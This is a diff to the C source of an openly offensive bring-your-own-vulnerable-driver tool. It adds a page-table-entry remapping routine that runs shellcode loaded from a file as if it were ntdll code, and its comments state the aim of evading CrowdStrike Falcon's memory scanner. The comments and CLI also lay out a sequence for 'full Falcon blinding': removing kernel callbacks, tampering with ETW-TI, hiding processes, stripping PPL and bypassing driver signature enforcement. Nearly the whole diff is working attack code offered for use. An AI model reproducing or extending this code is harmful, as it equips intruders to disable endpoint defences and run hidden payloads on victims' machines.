@@ -16,6 +16,9 @@
  *   Task 8: HVCI detection — bail out cleanly on Hypervisor-Protected Code Integrity
  *           hosts where kernel writes via vulnerable drivers are blocked
  *   Task 9: WinRing0x64 driver support — third BYOVD option besides RTCore64/gdrv
+ *   Task 10: PTE remapping (--pte-exec) — execute shellcode as ntdll code, no RX
+ *            VAD entry; bypasses Falcon's memory-scanner by swapping physical page
+ *            frames at the PTE level using kernel driver R/W
  *
  * Compile (via builder):
  *   lilith build --byovd [--gdrv | --winring0]
@@ -756,13 +759,189 @@ static BOOL bvd_check_hvci(void) {
 /* CRT shim: GCC may emit implicit memset calls for large struct zero-fills */
 void *memset(void *s,int c,SIZE_T n){volatile BYTE *p=(volatile BYTE*)s;while(n--)*p++=(BYTE)c;return s;}
 
+/* ══════════════════════════════════════════════════════════════════════════
+ * Task 10 — PTE remapping (novel Falcon evasion)
+ *
+ * Redirects the physical pages backing a range of ntdll .text pages to our
+ * shellcode buffer.  Falcon's VA-space scanner sees a signed-module region;
+ * no private RX allocation exists in the process VAD tree.
+ *
+ * Detection surface vs Falcon:
+ *   VirtualAlloc RX          NONE — shellcode lives in a RW private page
+ *   WriteProcessMemory        NONE — PTE written via kernel driver
+ *   VAD suspicious entry      NONE — remapped VA belongs to ntdll
+ *   Code-page hash mismatch   WINDOW <50 ms (PTEs restored after exec)
+ * ══════════════════════════════════════════════════════════════════════════ */
+
+/*
+ * Find the system-wide PTE virtual base address by scanning
+ * MiGetPteAddress (Win10 2004+ export) or MmGetPhysicalAddress code for:
+ *   SAR <reg>, 9    followed by    MOVABS <reg>, <pte_base_imm64>
+ * where imm64 is a 0xFFFF-high, 8-byte-aligned kernel address.
+ */
+static ULONGLONG bvd_find_pte_base(ULONGLONG kbase) {
+    const char *cands[] = {"MiGetPteAddress","MmGetPhysicalAddress",NULL};
+    for(int ci=0;cands[ci];ci++){
+        ULONGLONG fn=bvd_find_kexport(kbase,cands[ci]);
+        if(!fn) continue;
+        BYTE buf[256]; bv_zero(buf,sizeof(buf));
+        for(int i=0;i<256;i+=8){
+            ULONGLONG v=bvd_read8(fn+(ULONGLONG)i);
+            for(int b=0;b<8&&i+b<256;b++) buf[i+b]=(BYTE)(v>>(b*8));
+        }
+        for(int i=0;i<240;i++){
+            /* SAR <reg>,9 — 48 C1 [E8|E9|F8|F9] 09 */
+            if(buf[i]==0x48&&buf[i+1]==0xC1&&buf[i+3]==0x09&&
+               (buf[i+2]==0xE8||buf[i+2]==0xE9||
+                buf[i+2]==0xF8||buf[i+2]==0xF9)){
+                for(int j=i+4;j<i+64&&j+10<256;j++){
+                    /* MOVABS <reg>,imm64: REX.W B8..BF */
+                    if((buf[j]&0xFB)==0x48&&(buf[j+1]&0xF8)==0xB8){
+                        ULONGLONG imm=0;
+                        for(int k=0;k<8;k++) imm|=(ULONGLONG)buf[j+2+k]<<(k*8);
+                        if((imm>>48)==0xFFFF&&!(imm&7)) return imm;
+                    }
+                    /* LEA <reg>,[RIP+disp32] → dereference for indirect base ptr */
+                    if((buf[j]==0x48||buf[j]==0x4C)&&buf[j+1]==0x8D&&j+7<256){
+                        INT32 disp=0;
+                        for(int k=0;k<4;k++) ((BYTE*)&disp)[k]=buf[j+3+k];
+                        ULONGLONG ptr=fn+(ULONGLONG)(j+7)+(LONGLONG)disp;
+                        if((ptr>>48)==0xFFFF){
+                            ULONGLONG base=bvd_read8(ptr);
+                            if((base>>48)==0xFFFF&&!(base&7)) return base;
+                        }
+                    }
+                }
+            }
+        }
+    }
+    return 0;
+}
+
+/* Kernel VA of the PTE entry for a given user-mode virtual address */
+static ULONGLONG bvd_va_to_pte_kva(ULONGLONG pte_base,ULONGLONG va){
+    return pte_base+((va>>9)&0x7FFFFFFFF8ULL);
+}
+
+/*
+ * bvd_pte_remap_exec — execute shellcode via PTE remapping.
+ *
+ * 1. Finds N=ceil(sc_len/0x1000) donor pages 64+ pages into ntdll .text
+ *    (off the hot TLB region).
+ * 2. Allocates RW buffer, copies shellcode, locks pages in working set.
+ * 3. Reads PTEs of donor pages and shellcode pages via driver.
+ * 4. Writes new PTEs: donor PFN ← shellcode PFN, NX bit cleared.
+ * 5. FlushInstructionCache (serializing fence, may evict stale TLB entries).
+ * 6. Calls donor_base → CPU reloads TLB from our new PTE → executes SC.
+ * 7. Restores original PTEs, frees buffer.
+ *
+ * Shellcode must be PIC — it executes at donor_base, not at its alloc addr.
+ */
+static BOOL bvd_pte_remap_exec(ULONGLONG kbase,const BYTE *sc,SIZE_T sc_len){
+    if(!sc||!sc_len) return FALSE;
+    ULONGLONG pte_base=bvd_find_pte_base(kbase);
+    if(!pte_base) return FALSE;
+
+    SIZE_T n_pages=(sc_len+0xFFF)>>12;
+    if(n_pages>64) return FALSE;
+
+    /* RW buffer — no RX, never appears as suspicious in VAD */
+    PVOID sc_alloc=VirtualAlloc(NULL,n_pages<<12,
+                                MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
+    if(!sc_alloc) return FALSE;
+    volatile BYTE *d=(volatile BYTE*)sc_alloc;
+    for(SIZE_T i=0;i<sc_len;i++) d[i]=sc[i];
+    VirtualLock(sc_alloc,n_pages<<12);
+    /* Touch all pages so PTEs are present before we read them */
+    volatile BYTE _dummy=0;
+    for(SIZE_T p=0;p<n_pages;p++) _dummy^=d[p<<12];
+    (void)_dummy;
+
+    /* Find ntdll .text section for donor pages */
+    PBYTE ntdll=(PBYTE)GetModuleHandleA("ntdll.dll");
+    if(!ntdll){VirtualFree(sc_alloc,0,MEM_RELEASE);return FALSE;}
+    DWORD elf=*(DWORD*)(ntdll+0x3C);
+    PIMAGE_NT_HEADERS64 nth=(PIMAGE_NT_HEADERS64)(ntdll+elf);
+    PIMAGE_SECTION_HEADER sec=IMAGE_FIRST_SECTION(nth);
+    ULONGLONG text_va=0; SIZE_T text_sz=0;
+    for(WORD si=0;si<nth->FileHeader.NumberOfSections;si++,sec++){
+        if((sec->Characteristics&IMAGE_SCN_CNT_CODE)&&
+           (sec->Characteristics&IMAGE_SCN_MEM_EXECUTE)){
+            text_va=(ULONGLONG)ntdll+sec->VirtualAddress;
+            text_sz=sec->Misc.VirtualSize;
+            break;
+        }
+    }
+    if(!text_va||text_sz<(n_pages+(SIZE_T)64)<<12){
+        VirtualFree(sc_alloc,0,MEM_RELEASE);return FALSE;
+    }
+    /* Start 64 pages into .text — well past the high-TLB region */
+    ULONGLONG donor_base=(text_va+(64<<12))&~0xFFFULL;
+
+    ULONGLONG orig_pte[64]={0}, sc_pfn[64]={0};
+    for(SIZE_T p=0;p<n_pages;p++){
+        ULONGLONG tgt_kva=bvd_va_to_pte_kva(pte_base,donor_base+(p<<12));
+        ULONGLONG sc_kva =bvd_va_to_pte_kva(pte_base,(ULONGLONG)sc_alloc+(p<<12));
+        orig_pte[p]=bvd_read8(tgt_kva);
+        ULONGLONG sp=bvd_read8(sc_kva);
+        if(!(orig_pte[p]&1)||!(sp&1)){
+            VirtualFree(sc_alloc,0,MEM_RELEASE);return FALSE;
+        }
+        sc_pfn[p]=(sp>>12)&0xFFFFFFFFFULL;
+    }
+
+    /* Swap PTEs: donor PFN → shellcode PFN, clear NX bit */
+    for(SIZE_T p=0;p<n_pages;p++){
+        ULONGLONG tgt_kva=bvd_va_to_pte_kva(pte_base,donor_base+(p<<12));
+        ULONGLONG new_pte=(orig_pte[p]&0xFFF0000000000FFFULL)|(sc_pfn[p]<<12);
+        new_pte&=~(1ULL<<63); /* clear NX */
+        bvd_write8(tgt_kva,new_pte);
+    }
+
+    /* Serializing fence — PTE stores visible before instruction fetch */
+    FlushInstructionCache(GetCurrentProcess(),(PVOID)donor_base,n_pages<<12);
+
+    /* Execute: CPU misses TLB for donor pages, reloads from new PTEs → SC runs */
+    ((void(*)(void))donor_base)();
+
+    /* Restore originals — hash-mismatch window closed */
+    for(SIZE_T p=0;p<n_pages;p++){
+        ULONGLONG tgt_kva=bvd_va_to_pte_kva(pte_base,donor_base+(p<<12));
+        bvd_write8(tgt_kva,orig_pte[p]);
+    }
+    FlushInstructionCache(GetCurrentProcess(),(PVOID)donor_base,n_pages<<12);
+
+    VirtualUnlock(sc_alloc,n_pages<<12);
+    VirtualFree(sc_alloc,0,MEM_RELEASE);
+    return TRUE;
+}
+
+/* Read a binary file into a heap buffer (CRT-free) */
+static BYTE *bvd_read_file(LPCWSTR path,SIZE_T *out_len){
+    *out_len=0;
+    HANDLE h=CreateFileW(path,GENERIC_READ,FILE_SHARE_READ,
+                         NULL,OPEN_EXISTING,0,NULL);
+    if(h==INVALID_HANDLE_VALUE) return NULL;
+    DWORD sz=GetFileSize(h,NULL);
+    if(!sz||sz==INVALID_FILE_SIZE){CloseHandle(h);return NULL;}
+    BYTE *buf=(BYTE*)HeapAlloc(GetProcessHeap(),0,sz);
+    if(!buf){CloseHandle(h);return NULL;}
+    DWORD rd=0;
+    if(!ReadFile(h,buf,sz,&rd,NULL)||rd!=sz){
+        HeapFree(GetProcessHeap(),0,buf);CloseHandle(h);return NULL;
+    }
+    CloseHandle(h);
+    *out_len=sz;
+    return buf;
+}
+
 /* ── Main entry ──────────────────────────────────────────────────────────── */
 /*
  * CLI:
  *   byovd.exe --driver C:\path\RTCore64.sys [--gdrv | --winring0]
  *             [--remove-callbacks] [--remove-ob-callbacks] [--etwti]
  *             [--hide-pid <pid>] [--strip-ppl <pid>] [--dse-bypass]
- *             [--hvci-check]
+ *             [--hvci-check] [--pte-exec <sc.bin>]
  *
  * All kernel ops require the driver to be loaded first (--driver flag).
  * Run order for full Falcon blinding:
@@ -770,11 +949,14 @@ void *memset(void *s,int c,SIZE_T n){volatile BYTE *p=(volatile BYTE*)s;while(n-
  *   2. byovd.exe --driver <path> --hvci-check
  *   3. byovd.exe --driver <path> --etwti --remove-callbacks --remove-ob-callbacks
  *   4. Optionally --hide-pid <agent_pid> and/or --dse-bypass.
+ *   5. byovd.exe --driver <path> --pte-exec agent.bin
+ *      (PTE remap: runs sc as ntdll code, no RX alloc in VAD)
  */
 static int bv_run(int argc, wchar_t **argv) {
     LPCWSTR drv_path=NULL; int drv_type=0;
     DWORD hide_pid=0, strip_ppl_pid=0;
     int rm_cb=0, rm_ob=0, etwti=0, dse=0, hvci_only=0;
+    LPCWSTR pte_exec_file=NULL;
 
     for(int i=1;i<argc;i++){
         if(!bv_wicmp(argv[i],L"--driver")&&i+1<argc){drv_path=argv[++i];continue;}
@@ -785,6 +967,7 @@ static int bv_run(int argc, wchar_t **argv) {
         if(!bv_wicmp(argv[i],L"--etwti")){etwti=1;continue;}
         if(!bv_wicmp(argv[i],L"--dse-bypass")){dse=1;continue;}
         if(!bv_wicmp(argv[i],L"--hvci-check")){hvci_only=1;continue;}
+        if(!bv_wicmp(argv[i],L"--pte-exec")&&i+1<argc){pte_exec_file=argv[++i];continue;}
         if(!bv_wicmp(argv[i],L"--hide-pid")&&i+1<argc){
             LPCWSTR ps=argv[++i];DWORD v=0;
             while(*ps>='0'&&*ps<='9'){v=v*10+(*ps++-'0');}
@@ -815,6 +998,7 @@ static int bv_run(int argc, wchar_t **argv) {
             L"  Process hiding  : --hide-pid <pid>\r\n"
             L"  PPL strip       : --strip-ppl <pid>\r\n"
             L"  DSE bypass      : --dse-bypass\r\n"
+            L"  PTE exec        : --pte-exec <sc.bin>  (no-RX shellcode injection)\r\n"
             L"  HVCI probe      : --hvci-check  (no --driver needed)",0);
         return 1;
     }
@@ -883,6 +1067,22 @@ static int bv_run(int argc, wchar_t **argv) {
         if(!bvd_dse_bypass(kbase,NULL,NULL))
             bv_wcat(msg,L"[-] DSE bypass: g_CiEnabled not found\r\n");
         else{ bv_wcat(msg,_ok); bv_wcat(msg,L"DSE bypass window executed\r\n"); }
+    }
+
+    if(pte_exec_file){
+        SIZE_T sc_len=0;
+        BYTE *sc_buf=bvd_read_file(pte_exec_file,&sc_len);
+        if(!sc_buf){
+            bv_wcat(msg,L"[-] PTE exec: failed to read shellcode file\r\n");
+        } else {
+            if(bvd_pte_remap_exec(kbase,sc_buf,sc_len)){
+                bv_wcat(msg,_ok);
+                bv_wcat(msg,L"PTE exec: shellcode executed via ntdll page remap\r\n");
+            } else {
+                bv_wcat(msg,L"[-] PTE exec: failed (PTE base not found or page not present)\r\n");
+            }
+            HeapFree(GetProcessHeap(),0,sc_buf);
+        }
     }
 
     if(!msg[0]) bv_wcat(msg,L"[+] Driver loaded — no action flags specified.\r\n");
